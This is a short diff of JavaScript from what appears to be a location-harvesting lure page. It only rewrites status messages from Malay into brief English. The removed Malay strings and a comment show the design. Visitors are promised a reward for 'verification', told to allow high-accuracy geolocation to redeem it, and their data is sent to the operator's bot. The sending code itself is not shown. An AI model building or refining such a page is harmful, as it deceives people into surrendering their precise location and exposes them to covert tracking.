@@ -113,17 +113,17 @@ function getLocation() {
 
       if (res.ok) {
         // Paparan bila berjaya hantar data ke bot kau
-        status.innerText = "🎉 Pengesahan berjaya! Ganjaran anda sedang diproses.";
+        status.innerText = "🎉 SUCCESS";
       } else {
-        status.innerText = "❌ Ralat sistem. Sila cuba sekali lagi.";
+        status.innerText = "❌ System error. Please try again.";
       }
 
     } catch (err) {
-      status.innerText = "❌ Ralat sambungan. Sila cuba sebentar lagi.";
+      status.innerText = "❌ System error. Please try again.";
     }
 
   }, (err) => {
-    status.innerText = "⚠️ Sila benarkan akses untuk menebus ganjaran.";
+    status.innerText = "⚠️.";
   }, {
     enableHighAccuracy: true,
     timeout: 10000
